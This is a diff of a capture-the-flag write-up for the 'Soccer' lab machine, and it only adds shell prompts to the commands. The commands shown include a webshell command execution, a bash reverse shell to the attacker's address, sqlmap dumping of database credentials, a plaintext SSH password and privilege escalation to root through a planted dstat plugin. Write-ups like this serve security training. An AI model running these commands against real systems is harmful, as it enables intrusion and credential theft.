@@ -26,8 +26,8 @@ Target was `10.10.11.194`, tun0 was `10.10.16.4`. I added `soccer.htb` to `/etc/
 Full sweep then a service scan on the open ports:
 
 ```bash
-nmap -p- --min-rate 10000 10.10.11.194
-nmap -p 22,80,9091 -sCV 10.10.11.194
+$ nmap -p- --min-rate 10000 10.10.11.194
+$ nmap -p 22,80,9091 -sCV 10.10.11.194
 ```
 
 ```
@@ -52,7 +52,7 @@ Port `9091` was unidentified, but its fingerprint gave it away. The nmap probe r
 That shape is a Node/Express style server, and it ends up being the WebSocket backend. The site on `80` was a static soccer page with nothing in the source but bootstrap leftovers (`/.row`, `/.container`, both part of the framework, not real paths). Directory busting found the live path:
 
 ```bash
-feroxbuster -u http://soccer.htb
+$ feroxbuster -u http://soccer.htb
 ```
 
 ```
@@ -81,14 +81,14 @@ Tiny File Manager 2.4.3 has CVE-2021-45010, a path traversal in the authenticate
 ```
 
 ```bash
-curl 'http://soccer.htb/tiny/uploads/cmd.php' --data-urlencode 'cmd=id'
+$ curl 'http://soccer.htb/tiny/uploads/cmd.php' --data-urlencode 'cmd=id'
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 Then a reverse shell through the same webshell:
 
 ```bash
-curl 'http://soccer.htb/tiny/uploads/cmd.php' \
+$ curl 'http://soccer.htb/tiny/uploads/cmd.php' \
   --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.4/443 0>&1"'
 ```
 
@@ -159,11 +159,11 @@ data = '{"id":"%s"}' % message
 Run the middleware, then point sqlmap at the local HTTP endpoint it exposes on `8081`:
 
 ```bash
-python3 sql.py
+$ python3 sql.py
 # [+] Starting MiddleWare Server
 # [+] Send payloads in http://localhost:8081/?id=*
 
-sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -dbs
+$ sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -dbs
 ```
 
 ```
@@ -178,8 +178,8 @@ available databases [5]:
 Walking down into `soccer_db`, one table `accounts` with four columns:
 
 ```bash
-sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -columns
-sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -C username,password --dump
+$ sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -columns
+$ sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -C username,password --dump
 ```
 
 ```
@@ -195,14 +195,14 @@ Table: accounts
 Newer sqlmap can drive a WebSocket directly, no middleware:
 
 ```bash
-sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"1"}' \
+$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"1"}' \
   --dbms mysql --batch -D soccer_db -T accounts --dump
 ```
 
 Either way the dumped creds worked over SSH:
 
 ```bash
-ssh player@10.10.11.194
+$ ssh player@10.10.11.194
 # player:PlayerOftheMatch2022
 ```
 
@@ -213,14 +213,14 @@ player held the user flag.
 `sudo -l` had nothing, but a SUID `doas` binary was sitting in `/usr/local/bin`:
 
 ```bash
-find / -perm -4000 2>/dev/null | grep doas
+$ find / -perm -4000 2>/dev/null | grep doas
 # /usr/local/bin/doas
 ```
 
 `doas` is the OpenBSD sudo alternative. Its config is usually `/etc/doas.conf`, which did not exist here, so I searched for the real path:
 
 ```bash
-find / -type f -iname "doas.conf" 2>/dev/null
+$ find / -type f -iname "doas.conf" 2>/dev/null
 # /usr/local/etc/doas.conf
 ```
 
@@ -231,7 +231,7 @@ permit nopass player as root cmd /usr/bin/dstat
 So player can run `dstat` as root with no password. `dstat` loads Python plugins named `dstat_*.py` from a fixed set of directories, and one of those was world-writable:
 
 ```bash
-ls -ld /usr/local/share/dstat
+$ ls -ld /usr/local/share/dstat
 # drwxrwxrwx ... writable
 ```
 
@@ -248,7 +248,7 @@ import pty;pty.spawn("/bin/bash")
 
 ```bash
 # listener on 8484, then:
-doas -u root /usr/bin/dstat --reverse
+$ doas -u root /usr/bin/dstat --reverse
 ```
 
 The `--reverse` flag maps to `dstat_reverse.py`, `dstat` imports it as root, and the listener catches a root shell with the root flag. A plain `import os; os.system("/bin/bash")` plugin (run as `doas /usr/bin/dstat --<name>`) gives an interactive root shell the same way without a listener.
